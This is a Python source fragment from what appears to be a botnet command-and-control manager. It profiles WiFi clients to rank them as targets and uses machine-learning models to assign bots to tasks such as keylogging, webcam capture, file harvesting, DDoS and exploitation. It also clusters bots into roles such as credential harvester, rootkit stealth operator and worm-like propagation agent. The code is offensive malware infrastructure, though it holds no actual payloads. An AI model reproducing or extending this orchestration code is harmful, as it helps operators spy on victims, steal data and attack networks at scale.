    async def _analyze_network_clients(self, bot: Bot, network: Dict) -> List[Dict]:
        """Analyze and classify network clients"""
        clients = []
        try:
            raw_clients = await self._capture_client_traffic(bot, network, duration=300)
            
            for client in raw_clients:
                profile = {
                    'mac': client['mac'],
                    'vendor': self._get_vendor_from_mac(client['mac']),
                    'device_type': self._detect_device_type(client['traffic']),
                    'os_type': self._detect_os_type(client['traffic']),
                    'traffic_pattern': self._analyze_traffic_pattern(client['traffic']),
                    'active_hours': self._estimate_active_hours(client['traffic']),
                    'risk_score': 0.0
                }
                
                # Calculate risk/value score
                profile['risk_score'] = self._calculate_client_score(profile)
                clients.append(profile)
                
            return sorted(clients, key=lambda x: x['risk_score'], reverse=True)
            
        except Exception as e:
            self.logger.error(f"Client analysis error: {str(e)}")
            return clients
            
    def _calculate_client_score(self, profile: Dict) -> float:
        """Calculate client risk/value score"""
        score = 0.0
        
        # Device type score
        if profile['device_type'] == 'computer':
            score += 0.4
        elif profile['device_type'] == 'mobile':
            score += 0.3
            
        # OS type score
        if profile['os_type'] in ['windows', 'linux']:
            score += 0.3
            
        # Traffic pattern score
        if profile['traffic_pattern'].get('data_transfer', 0) > 1000000:  # 1MB+
            score += 0.2
            
        # Active hours score
        active_hours = len(profile['active_hours'])
        if active_hours > 8:
            score += 0.1
            
        return min(score, 1.0)

    def cleanup(self) -> None:
        """Cleanup manager state"""
        self.running = False
        
        # Stop all WiFi monitoring
        for bot in self.bots.values():
            if bot.capabilities.get('wifi_injection'):
                asyncio.create_task(self._disable_monitor_mode(bot))
                
        # Cleanup resources
        self.executor.shutdown()

    def _init_ai_models(self):
        """Initialize AI models for botnet management"""
        try:
            # Task allocation AI
            self.ai_task_allocator = RandomForestClassifier(
                n_estimators=100,
                max_depth=10,
                random_state=42
            )
            
            # Performance prediction AI
            self.ai_performance_predictor = MLPRegressor(
                hidden_layer_sizes=(100, 50),
                max_iter=1000,
                random_state=42
            )
            
            # Bot clustering AI
            self.ai_bot_clusterer = KMeans(
                n_clusters=5,
                random_state=42
            )
            
            self.logger.info("AI models initialized successfully")
            
        except Exception as e:
            self.logger.error(f"Failed to initialize AI models: {e}")
    
    def _extract_bot_features(self, bot: Bot) -> np.ndarray:
        """Extract features from bot for AI analysis"""
        try:
            features = []
            
            # Performance metrics
            metrics = self.bot_metrics[bot.id]
            features.extend([
                metrics['success_rate'],
                metrics['response_time'],
                metrics['cpu_usage'],
                metrics['memory_usage']
            ])
            
            # Capability features
            capabilities = bot.capabilities
            features.extend([
                int(capabilities.get('keylogger', False)),
                int(capabilities.get('screenshot', False)),
                int(capabilities.get('webcam', False)),
                int(capabilities.get('file_access', False)),
                int(capabilities.get('network_scan', False)),
                int(capabilities.get('privilege_escalation', False))
            ])
            
            # System features
            features.extend([
                hash(bot.os or '') % 1000 / 1000.0,  # OS hash normalized
                hash(bot.arch or '') % 1000 / 1000.0,  # Arch hash normalized
                len(bot.tasks),
                bot.score / 100.0 if bot.score > 0 else 0.0,
                (datetime.now() - bot.last_seen).total_seconds() / 3600.0  # Hours since last seen
            ])
            
            # Network position features
            if bot.id in self.graph:
                features.extend([
                    self.graph.degree(bot.id),
                    nx.betweenness_centrality(self.graph).get(bot.id, 0.0),
                    nx.closeness_centrality(self.graph).get(bot.id, 0.0)
                ])
            else:
                features.extend([0.0, 0.0, 0.0])
            
            return np.array(features)
            
        except Exception as e:
            self.logger.error(f"Failed to extract bot features: {e}")
            return np.zeros(18)  # Default feature vector
    
    def _extract_task_features(self, task: Dict) -> np.ndarray:
        """Extract features from task for AI analysis"""
        try:
            features = []
            
            # Task type encoding
            task_types = ['keylog', 'screenshot', 'webcam', 'file_harvest', 'ddos', 'scan', 'exploit']
            task_type = task.get('type', '')
            task_encoding = [1.0 if task_type == t else 0.0 for t in task_types]
            features.extend(task_encoding)
            
            # Task properties
            features.extend([
                task.get('priority', 1) / 10.0,
                len(task.get('params', {})),
                int(task.get('stealth_required', False)),
                int(task.get('persistence_required', False)),
                task.get('estimated_duration', 60) / 3600.0  # Hours
            ])
            
            return np.array(features)
            
        except Exception as e:
            self.logger.error(f"Failed to extract task features: {e}")
            return np.zeros(12)  # Default feature vector
    
    def ai_allocate_task(self, task: Dict) -> List[str]:
        """Use AI to allocate task to optimal bots"""
        try:
            if not self.bots:
                return []
            
            # Extract task features
            task_features = self._extract_task_features(task)
            
            # Get bot scores for this task
            bot_scores = []
            bot_ids = []
            
            for bot_id, bot in self.bots.items():
                if bot.status != 'active':
                    continue
                
                # Extract bot features
                bot_features = self._extract_bot_features(bot)
                
                # Combine task and bot features
                combined_features = np.concatenate([task_features, bot_features])
                
                # Predict performance score
                if hasattr(self.ai_performance_predictor, 'predict') and len(self.performance_history) > 10:
                    try:
                        score = self.ai_performance_predictor.predict([combined_features])[0]
                    except:
                        score = self._calculate_traditional_score(bot, task)
                else:
                    score = self._calculate_traditional_score(bot, task)
                
                bot_scores.append(score)
                bot_ids.append(bot_id)
            
            if not bot_scores:
                return []
            
            # Select top bots based on scores
            num_bots = min(task.get('bot_count', 1), len(bot_ids))
            top_indices = np.argsort(bot_scores)[-num_bots:]
            
            selected_bots = [bot_ids[i] for i in top_indices]
            
            # Record allocation pattern for learning
            self.allocation_patterns[task.get('type', 'unknown')].append({
                'task_features': task_features,
                'selected_bots': selected_bots,
                'scores': [bot_scores[i] for i in top_indices]
            })
            
            return selected_bots
            
        except Exception as e:
            self.logger.error(f"AI task allocation failed: {e}")
            return self._fallback_allocate_task(task)
    
    def _calculate_traditional_score(self, bot: Bot, task: Dict) -> float:
        """Traditional scoring method as fallback"""
        score = 0.0
        
        # Base score from bot metrics
        metrics = self.bot_metrics[bot.id]
        score += metrics['success_rate'] * 50
        score += max(0, 10 - metrics['response_time']) * 5
        score += max(0, 100 - metrics['cpu_usage']) * 0.1
        score += max(0, 100 - metrics['memory_usage']) * 0.1
        
        # Capability matching
        task_type = task.get('type', '')
        if task_type in bot.capabilities and bot.capabilities[task_type]:
            score += 30
        
        # Load balancing
        current_load = len(bot.tasks)
        score -= current_load * 5
        
        return max(0, score)
    
    def _fallback_allocate_task(self, task: Dict) -> List[str]:
        """Fallback allocation method when AI fails"""
        available_bots = [
            (bot_id, self._calculate_traditional_score(bot, task))
            for bot_id, bot in self.bots.items()
            if bot.status == 'active'
        ]
        
        if not available_bots:
            return []
        
        # Sort by score and select top bots
        available_bots.sort(key=lambda x: x[1], reverse=True)
        num_bots = min(task.get('bot_count', 1), len(available_bots))
        
        return [bot_id for bot_id, _ in available_bots[:num_bots]]
    
    def ai_optimize_botnet_performance(self):
        """Use AI to optimize overall botnet performance"""
        try:
            if len(self.bots) < 5:
                return
            
            # Extract all bot features
            bot_features = []
            bot_ids = []
            
            for bot_id, bot in self.bots.items():
                if bot.status == 'active':
                    features = self._extract_bot_features(bot)
                    bot_features.append(features)
                    bot_ids.append(bot_id)
            
            if len(bot_features) < 3:
                return
            
            bot_features = np.array(bot_features)
            
            # Cluster bots for specialized roles
            if len(bot_features) >= 5:
                try:
                    clusters = self.ai_bot_clusterer.fit_predict(bot_features)
                    self._assign_specialized_roles(bot_ids, clusters)
                except Exception as e:
                    self.logger.error(f"Bot clustering failed: {e}")
            
            # Optimize task distribution
            self._ai_rebalance_tasks()
            
            # Update bot scores based on performance
            self._ai_update_bot_scores()
            
            self.logger.info("AI botnet optimization completed")
            
        except Exception as e:
            self.logger.error(f"AI optimization failed: {e}")
    
    def _assign_specialized_roles(self, bot_ids: List[str], clusters: np.ndarray):
        """Assign specialized roles to bots based on clustering"""
        try:
            role_mapping = {
                0: 'data_collector',
                1: 'network_scanner',
                2: 'attack_executor',
                3: 'stealth_operator',
                4: 'propagation_agent'
            }
            
            for bot_id, cluster in zip(bot_ids, clusters):
                if bot_id in self.bots:
                    role = role_mapping.get(cluster, 'general')
                    self.bots[bot_id].tags.add(f"role:{role}")
                    
                    # Adjust bot capabilities based on role
                    self._optimize_bot_for_role(bot_id, role)
            
        except Exception as e:
            self.logger.error(f"Role assignment failed: {e}")
    
    def _optimize_bot_for_role(self, bot_id: str, role: str):
        """Optimize bot configuration for specific role"""
        try:
            bot = self.bots[bot_id]
            
            if role == 'data_collector':
                # Prioritize data collection capabilities
                priority_caps = ['keylogger', 'screenshot', 'credential_harvester', 'file_access']
            elif role == 'network_scanner':
                # Prioritize network capabilities
                priority_caps = ['network_scan', 'port_scan', 'vulnerability_scan']
            elif role == 'attack_executor':
                # Prioritize attack capabilities
                priority_caps = ['ddos', 'exploit', 'lateral_movement']
            elif role == 'stealth_operator':
                # Prioritize stealth capabilities
                priority_caps = ['anti_detection', 'process_migration', 'rootkit']
            elif role == 'propagation_agent':
                # Prioritize spreading capabilities
                priority_caps = ['network_spread', 'usb_spread', 'email_spread']
            else:
                priority_caps = []
            
            # Update bot priority scores for role-specific tasks
            for cap in priority_caps:
                if cap in bot.capabilities:
                    bot.score += 10
                    
        except Exception as e:
            self.logger.error(f"Bot optimization failed: {e}")
    
    def _ai_rebalance_tasks(self):
        """Rebalance tasks using AI insights"""
        try:
            # Get overloaded bots
            overloaded_bots = [
                bot_id for bot_id, load in self.bot_loads.items()
                if load > 3 and bot_id in self.bots
            ]
            
            # Get underutilized bots
            underutilized_bots = [
                bot_id for bot_id, bot in self.bots.items()
                if self.bot_loads[bot_id] < 1 and bot.status == 'active'
            ]
            
            # Redistribute tasks
            for overloaded_bot in overloaded_bots:
                if underutilized_bots:
                    bot = self.bots[overloaded_bot]
                    if bot.tasks:
                        # Move lowest priority task to underutilized bot
                        task_to_move = min(bot.tasks, key=lambda t: t.get('priority', 1))
                        target_bot = underutilized_bots[0]
                        
                        # AI-assisted task migration
                        if self._ai_can_handle_task(target_bot, task_to_move):
                            self._migrate_task(overloaded_bot, target_bot, task_to_move)
                            underutilized_bots.pop(0)
                            
        except Exception as e:
            self.logger.error(f"Task rebalancing failed: {e}")
    
    def _ai_can_handle_task(self, bot_id: str, task: Dict) -> bool:
        """Use AI to determine if bot can handle task"""
        try:
            bot = self.bots[bot_id]
            task_type = task.get('type', '')
            
            # Check basic capability
            if not bot.capabilities.get(task_type, False):
                return False
            
            # AI-based compatibility check
            bot_features = self._extract_bot_features(bot)
            task_features = self._extract_task_features(task)
            combined_features = np.concatenate([task_features, bot_features])
            
            # Predict success probability
            if hasattr(self.ai_performance_predictor, 'predict') and len(self.performance_history) > 10:
                try:
                    success_prob = self.ai_performance_predictor.predict([combined_features])[0]
                    return success_prob > 0.6  # 60% success threshold
                except:
                    pass
            
            # Fallback to traditional check
            return self._traditional_capability_check(bot, task)
            
        except Exception as e:
            self.logger.error(f"AI capability check failed: {e}")
            return False
    
    def _traditional_capability_check(self, bot: Bot, task: Dict) -> bool:
        """Traditional capability checking method"""
        task_type = task.get('type', '')
        
        # Basic capability check
        if not bot.capabilities.get(task_type, False):
            return False
        
        # Performance history check
        metrics = self.bot_metrics[bot.id]
        if metrics['success_rate'] < 0.3:  # 30% minimum success rate
            return False
        
        # Load check
        if len(bot.tasks) >= 5:  # Maximum 5 concurrent tasks
            return False
        
        return True
    
    def _migrate_task(self, from_bot: str, to_bot: str, task: Dict):
        """Migrate task between bots"""
        try:
            # Remove from source bot
            self.bots[from_bot].tasks.remove(task)
            self.bot_loads[from_bot] -= 1
            
            # Add to target bot
            task['bot_id'] = to_bot
            self.bots[to_bot].tasks.append(task)
            self.bot_loads[to_bot] += 1
            
            self.logger.info(f"Migrated task {task['id']} from {from_bot} to {to_bot}")
            
        except Exception as e:
            self.logger.error(f"Task migration failed: {e}")
    
    def _ai_update_bot_scores(self):
        """Update bot scores using AI analysis"""
        try:
            for bot_id, bot in self.bots.items():
                if bot.status != 'active':
                    continue
                
                # Get current metrics
                metrics = self.bot_metrics[bot_id]
                
                # Calculate AI-enhanced score
                features = self._extract_bot_features(bot)
                
                # Base score from metrics
                score = (
                    metrics['success_rate'] * 40 +
                    max(0, 20 - metrics['response_time']) * 2 +
                    max(0, 100 - metrics['cpu_usage']) * 0.3 +
                    max(0, 100 - metrics['memory_usage']) * 0.3
                )
                
                # AI enhancement factor
                try:
                    if len(features) > 0:
                        # Normalize features for scoring
                        normalized_features = self.ai_scaler.fit_transform([features])[0]
                        ai_factor = np.mean(normalized_features) * 20
                        score += ai_factor
                except:
                    pass
                
                # Network position bonus
                if bot_id in self.graph:
                    centrality = nx.betweenness_centrality(self.graph).get(bot_id, 0)
                    score += centrality * 30
                
                # Update bot score
                bot.score = max(0, min(100, int(score)))
                
        except Exception as e:
            self.logger.error(f"AI score update failed: {e}")
    
    def ai_train_models(self):
        """Train AI models with collected data"""
        try:
            if len(self.task_history) < 50:
                return  # Need more data
            
            # Prepare training data
            X_task = []
            X_perf = []
            y_success = []
            y_performance = []
            
            for record in self.task_history[-1000:]:  # Use last 1000 records
                task_features = record.get('task_features', [])
                bot_features = record.get('bot_features', [])
                success = record.get('success', False)
                performance = record.get('performance_score', 0.0)
                
                if len(task_features) > 0 and len(bot_features) > 0:
                    combined_features = np.concatenate([task_features, bot_features])
                    X_task.append(combined_features)
                    X_perf.append(combined_features)
                    y_success.append(int(success))
                    y_performance.append(performance)
            
            if len(X_task) < 20:
                return
            
            X_task = np.array(X_task)
            X_perf = np.array(X_perf)
            y_success = np.array(y_success)
            y_performance = np.array(y_performance)
            
            # Train task allocation model
            try:
                self.ai_task_allocator.fit(X_task, y_success)
                self.logger.info("Task allocation model trained")
            except Exception as e:
                self.logger.error(f"Task allocation training failed: {e}")
            
            # Train performance prediction model
            try:
                self.ai_performance_predictor.fit(X_perf, y_performance)
                self.logger.info("Performance prediction model trained")
            except Exception as e:
                self.logger.error(f"Performance prediction training failed: {e}")
            
            # Save models
            self._save_ai_models()
            
        except Exception as e:
            self.logger.error(f"AI training failed: {e}")
    
    def _save_ai_models(self):
        """Save trained AI models"""
        try:
            if hasattr(self, 'ai_task_allocator'):
                joblib.dump(self.ai_task_allocator, 'ai_task_allocator.pkl')
            if hasattr(self, 'ai_performance_predictor'):
                joblib.dump(self.ai_performance_predictor, 'ai_performance_predictor.pkl')
            if hasattr(self, 'ai_bot_clusterer'):
                joblib.dump(self.ai_bot_clusterer, 'ai_bot_clusterer.pkl')
                
        except Exception as e:
            self.logger.error(f"Model saving failed: {e}")
    
    def _load_ai_models(self):
        """Load saved AI models"""
        try:
            import os
            if os.path.exists('ai_task_allocator.pkl'):
                self.ai_task_allocator = joblib.load('ai_task_allocator.pkl')
            if os.path.exists('ai_performance_predictor.pkl'):
                self.ai_performance_predictor = joblib.load('ai_performance_predictor.pkl')
            if os.path.exists('ai_bot_clusterer.pkl'):
                self.ai_bot_clusterer = joblib.load('ai_bot_clusterer.pkl')
                
        except Exception as e:
            self.logger.error(f"Model loading failed: {e}")